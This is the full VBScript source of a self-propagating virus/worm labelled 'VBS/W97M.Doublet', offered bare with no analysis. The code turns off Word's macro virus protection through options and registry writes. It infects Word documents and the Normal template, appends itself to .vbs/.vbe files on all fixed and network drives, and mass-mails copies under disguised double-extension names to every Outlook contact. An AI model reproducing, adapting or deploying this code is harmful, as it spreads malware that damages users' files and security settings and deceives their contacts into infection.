'VBS/W97M.Doublet
On Error Resume Next
Set sf=CreateObject("Scripting.FileSystemObject")
Set ws=CreateObject("WScript.Shell")
Set fl=sf.OpenTextFile(WScript.ScriptFullName,1)
virus=fl.ReadAll
fl.Close

personal=ws.SpecialFolders("MyDocuments")

sf.GetFile(WScript.ScriptFullName).Copy(sf.GetSpecialFolder(0)&"\Doublet.vbs")

Set vw=sf.CreateTextFile("C:\Doublet.sys")
vw.WriteLine "Attribute VB_Name = ""Doublet"""
vw.WriteLine "Sub AutoOpen()"
vw.WriteLine "On Error Resume Next"
vw.WriteLine "Call FuckProtect"
vw.WriteLine "Call Infect"
vw.WriteLine "End Sub"
vw.WriteLine ""
vw.WriteLine "Sub HelpAbout()"
vw.WriteLine "If Day(Now) = 10 Then"
vw.WriteLine "MsgBox ""W97M/VBS.Doublet. Hahahahaha"", vbInformation, ""For "" + Application.UserName"
vw.WriteLine "End If"
vw.WriteLine "End Sub"
vw.WriteLine ""
vw.WriteLine "Sub Infect()"
vw.WriteLine "On Error Resume Next"
vw.WriteLine "Set Nor = NormalTemplate.VBProject.VBComponents"
vw.WriteLine "Set Doc = ActiveDocument.VBProject.VBComponents"
vw.WriteLine "Drop = ""C:\Doublet.sys"""
vw.WriteLine "If Nor.Item(""Doublet"").Name <> ""Doublet"" Then"
vw.WriteLine "    Doc(""Doublet"").Export Drop"
vw.WriteLine "    Nor.Import Drop"
vw.WriteLine "End If"
vw.WriteLine "If Doc.Item(""Doublet"").Name <> ""Doublet"" Then"
vw.WriteLine "    Nor(""Doublet"").Export Drop"
vw.WriteLine "    Doc.Import Drop"
vw.WriteLine "    ActiveDocument.Save"
vw.WriteLine "End If"
vw.WriteLine "End Sub"
vw.WriteLine ""
vw.WriteLine "Sub FuckProtect()"
vw.WriteLine "With Options"
vw.WriteLine "    .ConfirmConversions = False"
vw.WriteLine "    .VirusProtection = False"
vw.WriteLine "    .SaveNormalPrompt = False"
vw.WriteLine "End With"
vw.WriteLine "Select Case Application.Version"
vw.WriteLine "Case ""10.0"""
vw.WriteLine "    System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security"", ""Level"") = 1&"
vw.WriteLine "    System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security"", ""AccessVBOM"") = 1&"
vw.WriteLine "Case ""9.0"""
vw.WriteLine "    System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"", ""Level"") = 1&"
vw.WriteLine "End Select"
vw.WriteLine "WordBasic.DisableAutoMacros 0"
vw.WriteLine "End Sub"
vw.Close

lecteur()

ws.RegWrite "HKCU\Software\Microsoft\Office\10.0\Word\Security\AccessVBOM", 1, "REG_DWORD"
ws.RegWrite "HKCU\Software\Microsoft\Office\10.0\Word\Security\Level", 1, "REG_DWORD"
ws.RegWrite "HKCU\Software\Microsoft\Office\9.0\Word\Security\Level", 1, "REG_DWORD"

Set out=CreateObject("Outlook.Application")
Set MA=out.GetNameSpace("MAPI")
For Each C In MA.AddressLists
If C.AddressEntries.Count <> 0 Then
For D=1 To C.AddressEntries.Count

tmpname=""
randomize(timer)
namel=int(rnd(1)*20)+1
For lettre = 1 To namel
randomize(timer)
tmpname=tmpname & chr(int(rnd(1)*26)+97)
Next
typext = "execombatbmpjpggifdocxlsppthtmhtthta"
randomize(timer)
tmpext = int(rnd(1)*11)+1
tmpname=tmpname & "." & mid(typext,((tmpext-1)*3)+1,3) & ".vbs"
sf.GetFile(WScript.ScriptFullName).Copy(sf.GetSpecialFolder(0)&"\"&tmpname)
subject="Re: " & left(tmpname,len(tmpname)-4) & " for you."

Set AD=C.AddressEntries(D)
Set mail=out.CreateItem(0)
mail.To=AD.Address
mail.Subject=subject
body="Hi " & AD.Name & ","
body = body & VbCrLf & "Look at this attached found on the net."
body = body & VbCrLf & ""
body = body & VbCrLf & "	See you soon"
mail.Body=body
mail.Attachments.Add(sf.GetSpecialFolder(0)&"\"&tmpname)
mail.DeleteAfterSubmit=True
If mail.To <> "" Then
mail.Send
sf.DeleteFile sf.GetSpecialFolder(0)&"\"&tmpname
End If
Next
End If
Next


Set wrd=WScript.CreateObject("Word.Application")
If wrd Is Nothing Then WScript.Quit
wrd.Visible=False
Set srch = wrd.Application.FileSearch
srch.Lookin = ""&personal&"": srch.SearchSubFolders = True: srch.FileName="*.doc": srch.Execute
For f = 1 To srch.FoundFiles.Count
victim = srch.FoundFiles(f)
wrd.Documents.Open victim
Set Doc=wrd.ActiveDocument.VBProject.VBComponents
If Doc.Item("Doublet").Name <> "Doublet" Then
	Doc.Import ("C:\Doublet.sys")
	wrd.ActiveDocument.Save
	End If
wrd.ActiveDocument.Close
Next
wrd.Application.Quit

Sub lecteur()
On Error Resume Next
dim f,f1,fc
Set dr = sf.Drives
For Each d in dr
If d.DriveType=2 or d.DriveType=3 Then
liste(d.path&"\")
End If
Next
End Sub

Sub infecte(dossier)
On Error Resume Next
Set sf=CreateObject("Scripting.FileSystemObject")
Set f = sf.GetFolder(dossier)
Set fc = f.Files
For Each f1 in fc
ext = sf.GetExtensionName(f1.path)
ext = lcase(ext)
if (ext="vbs") or (ext="vbe") Then
	Set cot=sf.OpenTextFile(f1.path, 1, False)
	If cot.ReadLine <> "'VBS/W97M.Doublet" then
	cot.Close
	Set cot=sf.OpenTextFile(f1.path, 1, False)
	vbsorg=cot.ReadAll()
	cot.Close
	Set inf=sf.OpenTextFile(f1.path,2,True)
	inf.WriteLine "'VBS/W97M.Doublet"
	inf.Write(vbsorg)
	inf.WriteLine ""
	inf.WriteLine virus
	inf.Close
	End If
End If
Next
End Sub

Sub liste(dossier)
On Error Resume Next
Set f = sf.GetFolder(dossier)
Set sf = f.SubFolders
For Each f1 in sf
infecte(f1.path)
liste(f1.path)
Next
End Sub